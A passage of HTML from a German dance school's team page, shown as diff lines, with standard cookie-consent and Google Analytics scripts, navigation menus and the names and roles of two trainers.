+        consentsFromCookie.analytics_storage = BorlabsCookie.Consents.hasConsent('google-analytics') ? 'granted' : 'denied';
+
+        BorlabsCookie.CookieLibrary.setCookie(
+            'borlabs-cookie-gcs',
+            JSON.stringify(consentsFromCookie),
+            BorlabsCookie.Settings.automaticCookieDomainAndPath.value ? '' : BorlabsCookie.Settings.cookieDomain.value,
+            BorlabsCookie.Settings.cookiePath.value,
+            BorlabsCookie.Cookie.getPluginCookie().expires,
+            BorlabsCookie.Settings.cookieSecure.value,
+            BorlabsCookie.Settings.cookieSameSite.value
+        );
+    }
+    document.addEventListener('borlabs-cookie-consent-saved', borlabsCookieConsentChangeHandler);
+    document.addEventListener('borlabs-cookie-handle-unblock', borlabsCookieConsentChangeHandler);
+}
+if ('0' === '1') {
+    gtag("js", new Date());
+    gtag("config", "G-4ET03KK8H7", {"anonymize_ip": true});
+
+    (function (w, d, s, i) {
+        var f = d.getElementsByTagName(s)[0],
+            j = d.createElement(s);
+        j.async = true;
+        j.src =
+            "https://www.googletagmanager.com/gtag/js?id=" + i;
+        f.parentNode.insertBefore(j, f);
+    })(window, document, "script", "G-4ET03KK8H7");
+}
+</script><script data-no-optimize="1" data-no-minify="1" data-cfasync="false" data-borlabs-cookie-script-blocker-ignore>
+if ('0' === '1' && ('0' === '1' || '1' === '1')) {
+    window['gtag_enable_tcf_support'] = true;
+}
+window.dataLayer = window.dataLayer || [];
+if (typeof gtag !== 'function') {
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+}
+gtag('set', 'developer_id.dYjRjMm', true);
+if ('0' === '1' || '1' === '1') {
+    if (window.BorlabsCookieGoogleConsentModeDefaultSet !== true) {
+        let getCookieValue = function (name) {
+            return document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || '';
+        };
+        let cookieValue = getCookieValue('borlabs-cookie-gcs');
+        let consentsFromCookie = {};
+        if (cookieValue !== '') {
+            consentsFromCookie = JSON.parse(decodeURIComponent(cookieValue));
+        }
+        let defaultValues = {
+            'ad_storage': 'denied',
+            'ad_user_data': 'denied',
+            'ad_personalization': 'denied',
+            'analytics_storage': 'denied',
+            'functionality_storage': 'denied',
+            'personalization_storage': 'denied',
+            'security_storage': 'denied',
+            'wait_for_update': 500,
+        };
+        gtag('consent', 'default', { ...defaultValues, ...consentsFromCookie });
+    }
+    window.BorlabsCookieGoogleConsentModeDefaultSet = true;
+    let borlabsCookieConsentChangeHandler = function () {
+        window.dataLayer = window.dataLayer || [];
+        if (typeof gtag !== 'function') { function gtag(){dataLayer.push(arguments);} }
+
+        let getCookieValue = function (name) {
+            return document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || '';
+        };
+        let cookieValue = getCookieValue('borlabs-cookie-gcs');
+        let consentsFromCookie = {};
+        if (cookieValue !== '') {
+            consentsFromCookie = JSON.parse(decodeURIComponent(cookieValue));
+        }
+
+        consentsFromCookie.analytics_storage = BorlabsCookie.Consents.hasConsent('google-analytics-four') ? 'granted' : 'denied';
+
+        BorlabsCookie.CookieLibrary.setCookie(
+            'borlabs-cookie-gcs',
+            JSON.stringify(consentsFromCookie),
+            BorlabsCookie.Settings.automaticCookieDomainAndPath.value ? '' : BorlabsCookie.Settings.cookieDomain.value,
+            BorlabsCookie.Settings.cookiePath.value,
+            BorlabsCookie.Cookie.getPluginCookie().expires,
+            BorlabsCookie.Settings.cookieSecure.value,
+            BorlabsCookie.Settings.cookieSameSite.value
+        );
+    }
+    document.addEventListener('borlabs-cookie-consent-saved', borlabsCookieConsentChangeHandler);
+    document.addEventListener('borlabs-cookie-handle-unblock', borlabsCookieConsentChangeHandler);
+}
+if ('0' === '1') {
+    document.addEventListener('borlabs-cookie-after-init', function () {
+		window.BorlabsCookie.Unblock.unblockScriptBlockerId('google-analytics-four');
+	});
+}
+</script>			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<!-- Google tag (gtag.js) -->
+<script data-borlabs-cookie-script-blocker-id='google-analytics-four' type='text/template' data-borlabs-cookie-script-blocker-src="https://www.googletagmanager.com/gtag/js?id=G-4ET03KK8H7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4ET03KK8H7');
+</script><link rel="icon" href="https://motsimabuse-dietanzschule.de/wp-content/uploads/2021/01/favicon2-150x150.jpg" sizes="32x32" />
+<link rel="icon" href="https://motsimabuse-dietanzschule.de/wp-content/uploads/2021/01/favicon2-300x300.jpg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://motsimabuse-dietanzschule.de/wp-content/uploads/2021/01/favicon2-300x300.jpg" />
+<meta name="msapplication-TileImage" content="https://motsimabuse-dietanzschule.de/wp-content/uploads/2021/01/favicon2-300x300.jpg" />
+</head>
+<body class="wp-singular page-template-default page page-id-6615 wp-custom-logo wp-embed-responsive wp-theme-hello-elementor wp-child-theme-hello-theme-child-master hello-elementor-default elementor-default elementor-kit-7 elementor-page elementor-page-6615">
+
+
+		<e-page-transition class="e-page-transition--entering" exclude="^https\:\/\/motsimabuse\-dietanzschule\.de\/wp\-admin\/">
+					</e-page-transition>
+		
+<a class="skip-link screen-reader-text" href="#content">Zum Inhalt springen</a>
+
+		<nav data-elementor-type="header" data-elementor-id="4949" class="elementor elementor-4949 elementor-location-header" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-a609011 e-con-full elementor-hidden-tablet elementor-hidden-mobile e-flex elementor-invisible e-con e-parent" data-id="a609011" data-element_type="container" data-settings="{&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_offset&quot;:30,&quot;sticky_on&quot;:[&quot;widescreen&quot;,&quot;desktop&quot;,&quot;laptop&quot;,&quot;tablet&quot;],&quot;sticky_effects_offset&quot;:1000,&quot;animation&quot;:&quot;fadeIn&quot;,&quot;sticky_anchor_link_offset&quot;:0}">
+		<div class="elementor-element elementor-element-a0b07dd e-con-full e-flex e-con e-child" data-id="a0b07dd" data-element_type="container">
+				<div class="elementor-element elementor-element-edada23 elementor-invisible elementor-widget elementor-widget-image" data-id="edada23" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInDown&quot;,&quot;_animation_delay&quot;:500}" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+																<a href="https://motsimabuse-dietanzschule.de/">
+							<img width="220" height="110" src="https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/tanzschule_top.svg" class="attachment-full size-full wp-image-8792" alt="" />								</a>
+															</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-d61fa7b e-con-full e-flex e-con e-child" data-id="d61fa7b" data-element_type="container">
+				<div class="elementor-element elementor-element-4957b29 elementor-hidden-tablet elementor-hidden-mobile elementor-widget elementor-widget-ekit-nav-menu" data-id="4957b29" data-element_type="widget" data-widget_type="ekit-nav-menu.default">
+				<div class="elementor-widget-container">
+							<nav class="ekit-wid-con ekit_menu_responsive_tablet" 
+			data-hamburger-icon="icon icon-burger-menu" 
+			data-hamburger-icon-type="icon" 
+			data-responsive-breakpoint="1024">
+			            <button class="elementskit-menu-hamburger elementskit-menu-toggler"  type="button" aria-label="hamburger-icon">
+                <i aria-hidden="true" class="ekit-menu-icon icon icon-burger-menu"></i>            </button>
+            <div id="ekit-megamenu-main_nav" class="elementskit-menu-container elementskit-menu-offcanvas-elements elementskit-navbar-nav-default ekit-nav-menu-one-page-no ekit-nav-dropdown-click"><ul id="menu-main_nav" class="elementskit-navbar-nav elementskit-menu-po-center submenu-click-on-"><li id="menu-item-12292" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12292 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Tanzen<i class="elementskit-submenu-indicator icon icon-plus" aria-hidden="true"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li id="menu-item-5774" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5774 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/" class="dropdown-item">Kursübersicht</a>	<li id="menu-item-4223" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4223 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-kinder-und-jugendliche/" class="dropdown-item">Kurse für Kinder und Jugendliche</a>	<li id="menu-item-4224" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4224 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-erwachsene/" class="dropdown-item">Kurse für Erwachsene</a>	<li id="menu-item-12352" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12352 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kurse/paarkurse/" class="dropdown-item">Paarkurse</a>	<li id="menu-item-8086" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8086 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/schnupperstunden/" class="dropdown-item">Schnupperstunden</a>	<li id="menu-item-10815" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10815 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/gutscheine/" class="dropdown-item">Gutscheine</a></ul>
+</li>
+<li id="menu-item-12105" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12105 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Events<i class="elementskit-submenu-indicator icon icon-plus" aria-hidden="true"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li id="menu-item-5545" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5545 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/events/" class="dropdown-item">Alle Events</a>	<li id="menu-item-1136" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1136 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/dein-event/" class="dropdown-item">Dein Event</a>	<li id="menu-item-10512" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10512 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/ladies-retreat/" class="dropdown-item">Ladies Just Us Retreat</a>	<li id="menu-item-10031" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10031 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/christmas-cup/" class="dropdown-item">Christmas Cup</a></ul>
+</li>
+<li id="menu-item-5513" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5513 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/fitness/" class="ekit-menu-nav-link">Fitness</a></li>
+<li id="menu-item-12106" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12106 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Online<i class="elementskit-submenu-indicator icon icon-plus" aria-hidden="true"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li id="menu-item-6912" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6912 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/online-kurse/" class="dropdown-item">Alle Online-Kurse</a>	<li id="menu-item-1138" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1138 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/12-wochen-challenge/" class="dropdown-item">12 Wochen Challenge</a>	<li id="menu-item-1139" class="important_item menu-item menu-item-type-post_type menu-item-object-page menu-item-1139 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/sportpaket/" class="important_item dropdown-item">Online-Mitgliedschaft</a></ul>
+</li>
+<li id="menu-item-5576" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5576 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/die-academy/" class="ekit-menu-nav-link">Die Academy</a></li>
+<li id="menu-item-12107" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-12107 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a href="#" class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Infos<i class="elementskit-submenu-indicator icon icon-plus" aria-hidden="true"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li id="menu-item-10814" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10814 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/gutscheine/" class="dropdown-item">Gutscheine</a>	<li id="menu-item-5631" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5631 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/mitgliedschaften/" class="dropdown-item">Mitgliedschaften</a>	<li id="menu-item-7558" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-6615 current_page_item menu-item-7558 nav-item elementskit-mobile-builder-content active" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/trainer/" class="dropdown-item active">Das Team</a>	<li id="menu-item-5602" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5602 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/aboutus/" class="dropdown-item">Über uns</a>	<li id="menu-item-5136" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5136 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kontakt/" class="dropdown-item">Kontakt</a>	<li id="menu-item-9807" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9807 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://www.free-defy.com/collections/motsi-mabuse-tanzschule" class="dropdown-item">Shop</a>	<li id="menu-item-9876" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9876 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="#wochenplan" class="dropdown-item">Wochenplan</a>	<li id="menu-item-13005" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13005 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/newsletter/" class="dropdown-item">Newsletter</a></ul>
+</li>
+<li id="menu-item-9806" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9806 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a target="_blank" href="https://www.free-defy.com/collections/motsi-mabuse-tanzschule" class="ekit-menu-nav-link">Shop</a></li>
+</ul><div class="elementskit-nav-identity-panel"><button class="elementskit-menu-close elementskit-menu-toggler" type="button">X</button></div></div>			
+			<div class="elementskit-menu-overlay elementskit-menu-offcanvas-elements elementskit-menu-toggler ekit-nav-menu--overlay"></div>        </nav>
+						</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-3146bc8 e-con-full e-flex e-con e-child" data-id="3146bc8" data-element_type="container">
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-4898df2 elementor-hidden-widescreen elementor-hidden-desktop elementor-hidden-laptop e-flex e-con-boxed e-con e-parent" data-id="4898df2" data-element_type="container" data-settings="{&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_offset&quot;:50,&quot;sticky_on&quot;:[&quot;tablet&quot;,&quot;mobile&quot;],&quot;sticky_offset_mobile&quot;:20,&quot;sticky_effects_offset&quot;:0,&quot;sticky_anchor_link_offset&quot;:0}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-07b4a4c elementor-widget elementor-widget-ekit-vertical-menu" data-id="07b4a4c" data-element_type="widget" data-settings="{&quot;sticky_on&quot;:[&quot;tablet&quot;,&quot;mobile&quot;],&quot;sticky_offset_mobile&quot;:30,&quot;sticky&quot;:&quot;top&quot;,&quot;_animation_mobile&quot;:&quot;none&quot;,&quot;sticky_offset&quot;:0,&quot;sticky_effects_offset&quot;:0,&quot;sticky_anchor_link_offset&quot;:0}" data-widget_type="ekit-vertical-menu.default">
+				<div class="elementor-widget-container">
+					<div class="ekit-wid-con">        <div 
+            class="ekit-vertical-main-menu-wraper ekit-vertical-main-menu-on-click  badge-position-left"
+        >
+                        <a href="#" class="ekit-vertical-menu-tigger">
+                                                                <i class="icon icon-burger-menu vertical-menu-left-icon vertical-menu-icon"></i>
+                        </a>
+                        <div class="ekit-vertical-menu-container"><ul id="menu-main_nav-1" class="ekit-vertical-navbar-nav submenu-click-on-"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12292 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Tanzen<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5774 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/" class="dropdown-item">Kursübersicht</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4223 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-kinder-und-jugendliche/" class="dropdown-item">Kurse für Kinder und Jugendliche</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4224 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-erwachsene/" class="dropdown-item">Kurse für Erwachsene</a>	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12352 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kurse/paarkurse/" class="dropdown-item">Paarkurse</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8086 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/schnupperstunden/" class="dropdown-item">Schnupperstunden</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10815 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/gutscheine/" class="dropdown-item">Gutscheine</a></ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12105 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Events<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5545 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/events/" class="dropdown-item">Alle Events</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1136 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/dein-event/" class="dropdown-item">Dein Event</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10512 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/ladies-retreat/" class="dropdown-item">Ladies Just Us Retreat</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10031 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/christmas-cup/" class="dropdown-item">Christmas Cup</a></ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5513 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/fitness/" class="ekit-menu-nav-link">Fitness</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12106 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Online<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6912 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/online-kurse/" class="dropdown-item">Alle Online-Kurse</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1138 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/12-wochen-challenge/" class="dropdown-item">12 Wochen Challenge</a>	<li class="important_item menu-item menu-item-type-post_type menu-item-object-page menu-item-1139 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/sportpaket/" class="important_item dropdown-item">Online-Mitgliedschaft</a></ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5576 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/die-academy/" class="ekit-menu-nav-link">Die Academy</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-12107 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a href="#" class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Infos<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10814 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/gutscheine/" class="dropdown-item">Gutscheine</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5631 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/mitgliedschaften/" class="dropdown-item">Mitgliedschaften</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-6615 current_page_item menu-item-7558 nav-item elementskit-mobile-builder-content active" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/trainer/" class="dropdown-item active">Das Team</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5602 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/aboutus/" class="dropdown-item">Über uns</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5136 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kontakt/" class="dropdown-item">Kontakt</a>	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9807 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://www.free-defy.com/collections/motsi-mabuse-tanzschule" class="dropdown-item">Shop</a>	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9876 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="#wochenplan" class="dropdown-item">Wochenplan</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13005 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/newsletter/" class="dropdown-item">Newsletter</a></ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9806 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a target="_blank" href="https://www.free-defy.com/collections/motsi-mabuse-tanzschule" class="ekit-menu-nav-link">Shop</a></li>
+</ul></div>        </div>
+        </div>				</div>
+				</div>
+					</div>
+				</div>
+				</nav>
+		
+<main id="content" class="site-main post-6615 page type-page status-publish hentry">
+
+	
+	<div class="page-content">
+				<div data-elementor-type="wp-page" data-elementor-id="6615" class="elementor elementor-6615" data-elementor-post-type="page">
+				<div class="elementor-element elementor-element-1e98e1e e-flex e-con-boxed e-con e-parent" data-id="1e98e1e" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-a7b156d e-flex e-con-boxed e-con e-child" data-id="a7b156d" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-7990ad8 elementor-widget elementor-widget-heading" data-id="7990ad8" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h1 class="elementor-heading-title elementor-size-default">DAS TEAM DER TANZSCHULE</h1>				</div>
+				</div>
+				<div class="elementor-element elementor-element-58108d0 elementor-widget elementor-widget-heading" data-id="58108d0" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Einfach immer mit Spaß bei der Sache</h4>				</div>
+				</div>
+					</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-880ed12 e-flex e-con-boxed e-con e-parent" data-id="880ed12" data-element_type="container">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-0d313a0 e-con-full elementor-hidden-laptop elementor-hidden-tablet elementor-hidden-mobile e-flex e-con e-child" data-id="0d313a0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-1a9c293 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="1a9c293" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-7c9452d elementor-widget elementor-widget-heading" data-id="7c9452d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">TEAM</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-2853349 elementor-widget elementor-widget-text-editor" data-id="2853349" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Unsere Tanzschulfamilie</p>								</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-4cd1543 e-con-full e-flex e-con e-child" data-id="4cd1543" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-b6d363a elementor-widget elementor-widget-heading" data-id="b6d363a" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">MOTSI</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-3b02e18 elementor-widget elementor-widget-text-editor" data-id="3b02e18" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Allround-Chefin &amp; Lets Dance-Jurorin</p>								</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-d59132b e-con-full e-flex e-con e-child" data-id="d59132b" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-81558cd elementor-widget elementor-widget-heading" data-id="81558cd" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">EVGENIJ</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-5d31701 elementor-widget elementor-widget-text-editor" data-id="5d31701" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Chef des Teams &amp; Head of Academy</p>								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-57460d1 e-flex e-con-boxed e-con e-parent" data-id="57460d1" data-element_type="container">
+					<div class="e-con-inner">
